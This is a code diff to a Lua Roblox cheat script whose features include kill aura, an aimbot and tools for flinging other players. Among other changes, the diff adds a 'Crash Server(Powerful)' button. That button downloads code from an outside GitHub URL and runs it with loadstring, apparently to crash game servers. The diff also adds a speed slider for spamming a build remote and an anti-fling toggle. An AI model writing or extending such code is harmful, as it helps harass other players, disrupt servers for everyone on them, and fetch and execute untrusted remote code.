@@ -371,6 +371,8 @@ AutoArmorDeluxeGroup:AddButton({
 			Library:Notify({ Title = "Error", Description = "Build remote not found", Time = 3 })
 			return
 		end
+		local speed = (Options.ToiletBedSpeed and Options.ToiletBedSpeed.Value) or 5
+		local delay = 1 / math.max(0.1, speed)
 		pcall(function()
 			buildRemote:InvokeServer(
 				90,
@@ -379,6 +381,7 @@ AutoArmorDeluxeGroup:AddButton({
 				nil
 			)
 		end)
+		task.wait(delay)
 		pcall(function()
 			buildRemote:InvokeServer(
 				85,
@@ -389,6 +392,15 @@ AutoArmorDeluxeGroup:AddButton({
 		end)
 		Library:Notify({ Title = "Toilet/Bed", Description = "Structures placed", Time = 2 })
 	end,
+})
+
+AutoArmorDeluxeGroup:AddSlider("ToiletBedSpeed", {
+	Text = "Place Speed",
+	Default = 5,
+	Min = 1,
+	Max = 20,
+	Rounding = 0,
+	Compact = true,
 })
 
 AutoArmorDeluxeGroup:AddDivider()
@@ -1246,6 +1258,11 @@ FunLeft:AddDropdown("HelicopterPlayerList", {
 	Default = "",
 })
 
+FunLeft:AddCheckbox("AntiFling", {
+	Text = "Anti Fling",
+	Default = false,
+})
+
 updateTouchFlingVisibility = function()
 	local isFling = (Toggles.TouchFling and Toggles.TouchFling.Value) or false
 
@@ -1505,6 +1522,20 @@ MainRight:AddButton({
 	Text = "Switch Server",
 	Func = function()
 		task.spawn(joinLowPingServer)
+	end,
+})
+
+MainRight:AddButton({
+	Text = "Crash Server(Powerful)",
+	Func = function()
+		local ok, err = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/sobachgroi67-cpu/idkgscripts/refs/heads/main/gscripts"))()
+		end)
+		if not ok then
+			Library:Notify({ Title = "Crash Server(Powerful)", Description = "Failed: " .. tostring(err), Time = 3 })
+			return
+		end
+		Library:Notify({ Title = "Crash Server(Powerful)", Description = "Loaded", Time = 2 })
 	end,
 })
 
@@ -1977,7 +2008,7 @@ end)
 -- ==========================================
 -- COMBAT
 -- ==========================================
-local CombatLeft = Tabs.Combat:AddLeftGroupbox("Kill Aura Pro", "swords")
+local CombatLeft = Tabs.Combat:AddLeftGroupbox("Kill Aura", "swords")
 
 local AimbotTabBox = Tabs.Combat:AddRightTabbox()
 local CombatCamlock = AimbotTabBox:AddTab("Camlock", "video")
@@ -7976,6 +8007,27 @@ Toggles.TouchFling:OnChanged(function()
 	end
 end)
 
+-- Anti Fling (stops others from flinging your character)
+Toggles.AntiFling:OnChanged(function()
+	disconnect("AntiFling")
+	if Toggles.AntiFling.Value then
+		track("AntiFling", RunService.Heartbeat:Connect(function()
+			if not Toggles.AntiFling.Value then return end
+			local char = getCharacter()
+			if not char then return end
+			local root = char:FindFirstChild("HumanoidRootPart")
+			if not root then return end
+			-- Kill the velocity spikes fling scripts depend on
+			if root.AssemblyLinearVelocity.Magnitude > 100 then
+				root.AssemblyLinearVelocity = Vector3.zero
+			end
+			if root.AssemblyAngularVelocity.Magnitude > 50 then
+				root.AssemblyAngularVelocity = Vector3.zero
+			end
+		end))
+	end
+end)
+
 -- Fling Your Victim Script Logic
 local helicopterAngle = 0
 local function startHelicopter()
@@ -8576,6 +8628,9 @@ Library:OnUnload(function()
 	if Toggles.TouchFling and Toggles.TouchFling.Value then
 		Toggles.TouchFling:SetValue(false)
 	end
+	if Toggles.AntiFling and Toggles.AntiFling.Value then
+		Toggles.AntiFling:SetValue(false)
+	end
 	if Toggles.InfiniteBackpack and Toggles.InfiniteBackpack.Value then
 		Toggles.InfiniteBackpack:SetValue(false)
 	end
@@ -8643,6 +8698,9 @@ Library:OnUnload(function()
 	end
 	if Toggles.TouchFling and Toggles.TouchFling.Value then
 		Toggles.TouchFling:SetValue(false)
+	end
+	if Toggles.AntiFling and Toggles.AntiFling.Value then
+		Toggles.AntiFling:SetValue(false)
 	end
 	if Toggles.HelicopterTroll and Toggles.HelicopterTroll.Value then
 		Toggles.HelicopterTroll:SetValue(false)
